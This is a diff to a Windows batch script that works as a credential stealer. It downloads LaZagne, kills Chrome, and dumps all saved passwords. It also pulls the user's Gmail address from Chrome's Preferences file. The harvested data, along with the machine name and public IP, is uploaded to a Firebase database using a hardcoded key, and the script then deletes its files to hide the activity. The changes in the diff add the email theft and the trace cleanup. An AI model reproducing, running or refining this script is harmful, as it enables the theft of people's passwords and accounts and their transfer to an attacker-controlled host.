@@ -2,45 +2,64 @@
 chcp 65001 >nul
 setlocal enabledelayedexpansion
 
+:: === CONFIGURATION ===
 set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
 set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
 set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
 set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
 set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"
 
+:: === DOWNLOAD LaZagne ===
 if not exist "%LAZAGNE_EXE%" (
-    powershell -Command "Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%' -UseBasicParsing"
+    powershell -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'"
+    if not exist "%LAZAGNE_EXE%" (
+        echo [ERROR] Cannot download LaZagne
+        exit /b 1
+    )
 )
 
+:: === KILL CHROME TO PREVENT LOCK ===
 taskkill /IM chrome.exe /F >nul 2>&1
 
-if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%"
-
+:: === RUN LAZAGNE TO EXTRACT CREDENTIALS ===
+mkdir "%OUTPUT_DIR%" >nul 2>&1
 "%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1
 
+:: === PARSE LATEST RESULT FILE ===
+set "RESULT_FILE="
 for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"
 
+:: === GET PC INFO ===
 set "PC_NAME=%COMPUTERNAME%"
 set "PC_NAME=!PC_NAME: =_!"
 set "PC_NAME=!PC_NAME:-=_!"
 
-for /f %%i in ('powershell -Command "(Invoke-RestMethod -Uri ''https://api.ipify.org'').Trim()"') do set "PUBLIC_IP=%%i"
-for /f %%i in ('powershell -Command "Get-Date -Format ''yyyy-MM-dd HH:mm:ss''"') do set "TIMESTAMP=%%i"
+:: === ATTEMPT TO EXTRACT GMAIL FROM CHROME PREFS ===
+set "EMAIL=unknown"
+set "CHROME_PREF=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Preferences"
 
-setlocal enabledelayedexpansion
-set "LAZAGNE_DATA="
-if defined RESULT_FILE (
-    set /p LAZAGNE_DATA=<"%OUTPUT_DIR%\%RESULT_FILE%"
+if exist "%CHROME_PREF%" (
+    for /f "delims=" %%E in ('powershell -Command ^
+        "try { $p = Get-Content -Raw -Path '%CHROME_PREF%' | ConvertFrom-Json; $p.account_info[0].email } catch { '' }"') do (
+        if not "%%E"=="" set "EMAIL=%%E"
+    )
+
+    if "%EMAIL%"=="unknown" (
+        for /f "delims=" %%E in ('powershell -Command ^
+            "try { (Get-Content -Raw -Path '%CHROME_PREF%' | ConvertFrom-Json).profile.email } catch { '' }"') do (
+            if not "%%E"=="" set "EMAIL=%%E"
+        )
+    )
 )
-if not defined LAZAGNE_DATA set "LAZAGNE_DATA=No data collected"
 
-set "LAZAGNE_DATA=!LAZAGNE_DATA:\=\\!"
-set "LAZAGNE_DATA=!LAZAGNE_DATA:"=\\\"!"
-
-set "JSON_PAYLOAD={\"computer\":\"%PC_NAME%\",\"timestamp\":\"%TIMESTAMP%\",\"ip\":\"%PUBLIC_IP%\",\"data\":\"!LAZAGNE_DATA!\"}"
-endlocal & set "JSON_PAYLOAD=%JSON_PAYLOAD%"
-
+:: === UPLOAD TO FIREBASE ===
 powershell -Command ^
-    "Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body '%JSON_PAYLOAD%' -ContentType 'application/json'"
+  "$ip = (Invoke-RestMethod -Uri 'https://api.ipify.org');" ^
+  "$content = Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%' -ErrorAction SilentlyContinue;" ^
+  "$json = @{ computer = '%PC_NAME%'; email = '%EMAIL%'; timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'); ip = $ip; data = $content } | ConvertTo-Json -Compress;" ^
+  "Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json';"
 
+:: === CLEANUP ===
+del /q "%LAZAGNE_EXE%" >nul 2>&1
+rd /s /q "%OUTPUT_DIR%" >nul 2>&1
 exit /b 0
